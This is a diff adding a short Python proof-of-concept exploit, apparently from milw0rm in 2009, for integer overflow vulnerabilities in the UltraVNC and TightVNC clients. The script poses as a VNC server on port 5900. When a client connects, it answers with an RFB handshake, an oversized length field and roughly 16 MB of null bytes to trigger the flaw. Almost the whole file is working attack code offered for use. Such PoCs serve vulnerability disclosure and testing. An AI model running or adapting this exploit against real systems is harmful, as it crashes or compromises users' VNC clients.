@@ -1,0 +1,34 @@
+#!/usr/bin/env python
+# POC: Multiple VNC Clients Multiple Integer Overflow Vulnerabilities(UltraVNC and TightVNC), BID 33568
+#Author: Andres Lopez Luksenberg <polakocai@gmail.com> (Visit: http://208.66.16.113/~andres/)
+#
+import socket
+
+serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+serversocket.bind(('', 5900))
+serversocket.listen(1)
+
+while True:
+		print "Author: Andres Lopez Luksenberg <polakocai@gmail.com> (Visit: http://208.66.16.113/~andres/)"
+
+		clientsocket, clientaddres = serversocket.accept()
+		
+		data = 'RFB 003.003\n'
+		clientsocket.sendall(data)
+
+		data_cli = clientsocket.recv(1024)
+		print data_cli
+
+		data = '\x00'
+		clientsocket.sendall(data)
+
+		data = '\x00\x00\x00\x75'
+		clientsocket.sendall(data)
+		data = '\x00' * int(0xffffff)
+
+		clientsocket.sendall(data)
+
+clientsocket.close()
+serversocket.close()
+
+# milw0rm.com [2009-02-04]
